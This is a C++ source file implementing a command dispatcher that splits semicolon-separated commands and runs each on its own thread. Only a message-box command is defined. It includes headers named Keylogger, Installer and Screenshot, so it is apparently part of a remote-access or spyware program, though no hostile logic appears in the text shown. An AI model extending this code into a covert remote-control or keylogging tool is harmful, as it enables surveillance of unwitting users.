#include "stdafx.h"
#include "CommandExe.h"
#include "Keylogger.h"
#include "Installer.h"
#include "Network.h"
#include "Screenshot.h"
#include "Settings.h"
#include "Info.h"
#include "Util.h"
#include "Command.h"
#include "CommandMessageBox.h"

static Command *CreateCommandFromName(const std::string &name)
{
	if(name == "msgbox")
		return new CommandMessageBox();
	else
		return NULL;
}

static int CommandThreadEntry(Command *command, const std::vector<std::tstring> &args)
{
	int ret = command->OnExecute(args);
	delete command;
	return ret;
}

CommandExe::CommandExe()
{

}

CommandExe::~CommandExe()
{

}

void CommandExe::JoinThreads()
{
	/* Join any command thread if they are done */
	for(auto itr = cmdThreads.begin(); itr != cmdThreads.end();) {
		if(!(*itr).joinable()) {
			/* Only increment if we do not erase anything */
			itr++;
			continue;
		}

		(*itr).join();
		itr = cmdThreads.erase(itr);
	}
}

void CommandExe::Run(const std::tstring& cmds)
{
	if (cmds.size() == 0) {
		return;
	}

	std::vector<std::tstring> commands = Util::split(cmds, ';');
	for (auto &cmd : commands) {
		std::vector<std::tstring> args = Util::split(cmd, ' ');
		args.erase(std::remove_if(args.begin(), args.end(), [&](const std::tstring &s) { return std::all_of(s.begin(), s.end(), _istspace); }), args.end());
		if (args.size()) {
			Command *command = CreateCommandFromName(args[0]);
			if(!command)
				continue;

			cmdThreads.push_back(std::thread(CommandThreadEntry, command, Util::split(Util::join_at_index(args, _T(" "), 1), ' ')));
		}
	}
}